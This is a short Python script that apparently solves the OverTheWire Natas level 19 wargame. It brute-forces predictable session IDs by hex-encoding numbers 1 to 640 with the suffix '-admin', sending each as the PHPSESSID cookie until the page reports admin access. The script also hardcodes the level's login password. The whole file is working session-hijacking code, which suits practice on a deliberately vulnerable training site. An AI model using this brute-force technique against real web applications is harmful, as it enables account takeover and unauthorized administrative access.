import binascii

import requests

for sessid in range(1, 641):
    if sessid % 10 == 0:
        print('Checked ' + str(sessid) + ' sessions...')

    phpsessid = binascii.hexlify((str(sessid) + '-admin').encode('ascii')).decode('ascii')
    r = requests.get('http://natas19.natas.labs.overthewire.org',
                     auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),
                     cookies={'PHPSESSID': phpsessid})

    if 'You are an admin' in r.text:
        print('PHPSESSID={}'.format(sessid))
        print(r.text)
        break
